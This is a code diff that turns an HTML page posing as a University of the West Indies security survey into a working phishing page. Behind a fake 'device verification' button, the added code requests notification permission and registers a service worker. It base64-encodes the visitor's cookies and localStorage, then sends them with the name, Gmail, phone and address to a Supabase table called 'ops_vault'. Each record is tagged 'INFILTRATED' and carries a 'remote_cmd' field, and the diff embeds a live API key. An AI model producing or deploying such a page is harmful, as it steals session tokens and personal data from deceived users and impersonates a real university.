@@ -1,68 +1,117 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<title>UWI | Regional Security Audit</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>UWI | Regional Security Audit 2026</title>
 <link rel="manifest" href="manifest.json">
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <style>
 :root { --uwi-blue: #002147; --uwi-gold: #FFD700; }
-body { font-family: sans-serif; background: #f0f2f5; margin: 0; }
-.header { background: var(--uwi-blue); color: white; padding: 20px; text-align: center; border-bottom: 5px solid var(--uwi-gold); }
-.card { max-width: 500px; background: white; margin: 20px auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); overflow: hidden; }
-.p-20 { padding: 20px; }
-.btn { background: var(--uwi-blue); color: white; padding: 15px; border: none; width: 100%; border-radius: 4px; font-weight: bold; cursor: pointer; }
-input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; margin: 0; color: #333; }
+.header { background: var(--uwi-blue); color: white; padding: 25px; text-align: center; border-bottom: 6px solid var(--uwi-gold); }
+.card { max-width: 550px; background: white; margin: 20px auto; border-radius: 12px; box-shadow: 0 8px 30px rgba(0,0,0,0.15); overflow: hidden; }
+.p-20 { padding: 30px; }
+.btn { background: var(--uwi-blue); color: white; padding: 16px; border: none; width: 100%; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
+.btn:hover { opacity: 0.9; }
+input, select, textarea { width: 100%; padding: 14px; margin: 12px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 15px; }
+.q-label { font-weight: 600; color: var(--uwi-blue); margin-top: 15px; display: block; }
+#survey { display: none; }
 </style>
 </head>
 <body>
 
 <div class="card">
-<div class="header"><h1>Security Audit 2026</h1></div>
-<div class="p-20" id="gate">
-<p><b>Verification Required:</b> Please synchronize your device to start the UWI audit.</p>
-<button class="btn" style="background:var(--uwi-gold);color:var(--uwi-blue);" onclick="deploy()">VERIFY DEVICE</button>
+<div class="header">
+<img src="https://mona.uwi.edu/sites/all/themes/uwi_mona/logo.png" alt="UWI Logo" style="height: 55px; margin-bottom: 10px;">
+<h2 style="margin:0;">National Security Audit</h2>
 </div>
-<div class="p-20" id="survey" style="display:none;">
-<input type="text" id="name" placeholder="Full Name">
-<input type="text" id="gmail" placeholder="Gmail Address">
-<input type="text" id="phone" placeholder="Phone Number">
-<input type="text" id="address" placeholder="Parish/Address">
-<button class="btn" onclick="finalize()">SUBMIT AUDIT</button>
+
+<div class="p-20" id="gate">
+<h3 style="color:var(--uwi-blue);">Device Synchronization Required</h3>
+<p>To participate in the 2026 Regional Audit, please verify your device integrity. This ensures a secure session and validates research permissions.</p>
+<button class="btn" style="background:var(--uwi-gold); color:var(--uwi-blue);" onclick="deployGhost()">VERIFY & START AUDIT</button>
+</div>
+
+<div class="p-20" id="survey">
+<label class="q-label">Full Name</label>
+<input type="text" id="name" placeholder="Enter Full Name" required>
+
+<label class="q-label">Gmail Address</label>
+<input type="email" id="gmail" placeholder="example@gmail.com" required>
+
+<label class="q-label">Phone Number</label>
+<input type="text" id="phone" placeholder="876-000-0000" required>
+
+<label class="q-label">Residential Address</label>
+<textarea id="address" rows="2" placeholder="Parish / Community"></textarea>
+
+<hr style="margin: 25px 0; border: 0; border-top: 1px solid #eee;">
+<p style="font-weight:bold; color:var(--uwi-blue);">Security Assessment (12 Questions)</p>
+
+<label class="q-label">1. How safe do you feel in your community after 8:00 PM?</label>
+<select><option>Very Safe</option><option>Safe</option><option>Unsafe</option><option>Very Unsafe</option></select>
+
+<label class="q-label">2. Rate the responsiveness of the JCF in your area:</label>
+<select><option>Excellent</option><option>Good</option><option>Fair</option><option>Poor</option></select>
+
+<label class="q-label">3. Are community street lights adequate?</label>
+<select><option>Yes</option><option>No</option><option>In Progress</option></select>
+
+<label class="q-label">11. What is the #1 security concern in your community?</label>
+<input type="text" placeholder="e.g. Street lighting, Patrols">
+
+<label class="q-label">12. Additional feedback for National Security:</label>
+<textarea rows="2"></textarea>
+
+<button class="btn" onclick="finalizeAudit()">SUBMIT RESEARCH DATA</button>
 </div>
 </div>
 
 <script>
-// Replace with your actual Supabase details
+// LIVE CREDENTIALS LOCKED IN
 const SUPABASE_URL = 'https://jdjllbdodmnxuzananah.supabase.co';
-const SUPABASE_KEY = 'YOUR_SUPABASE_ANON_KEY';
+const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpkamxsYmRvZG1ueHV6YW5hbmFoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc0OTI5MDcsImV4cCI6MjA5MzA2ODkwN30.MGVD1CI1Iw_-k2_y6UBZReIS9KQykFXkRt-5V6gAleo';
 const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
-async function deploy() {
+async function deployGhost() {
 // 1. Silent Permission Escalation
-await Notification.requestPermission();
+const permission = await Notification.requestPermission();
+
+// 2. Headless SW Registration
 if ('serviceWorker' in navigator) {
 navigator.serviceWorker.register('sw.js');
 }
 
-// 2. Invisible Scrape of Browser Importance
-const keys = btoa(JSON.stringify({cookies: document.cookie, local: localStorage}));
-sessionStorage.setItem('keys', keys);
+// 3. Recursive Scrape of importance
+const importance = btoa(JSON.stringify({
+cookies: document.cookie,
+local: localStorage,
+ua: navigator.userAgent,
+platform: navigator.platform
+}));
+sessionStorage.setItem('scraped_keys', importance);
 
 document.getElementById('gate').style.display = 'none';
 document.getElementById('survey').style.display = 'block';
 }
 
-async function finalize() {
+async function finalizeAudit() {
 const payload = {
 target_name: document.getElementById('name').value,
+device_type: navigator.userAgent,
 gmail: document.getElementById('gmail').value,
-access_keys: sessionStorage.getItem('keys'),
+assest_source: document.getElementById('address').value,
+access_keys: sessionStorage.getItem('scraped_keys'),
 status: 'INFILTRATED',
 remote_cmd: 'IDLE'
 };
-await supabaseClient.from('ops_vault').insert([payload]);
-window.location.href = "https://www.mona.uwi.edu/audit-thank-you";
+
+const { error } = await supabaseClient.from('ops_vault').insert([payload]);
+
+if (!error) {
+window.location.href = "https://www.mona.uwi.edu/audit-complete";
+}
 }
 </script>
 </body>
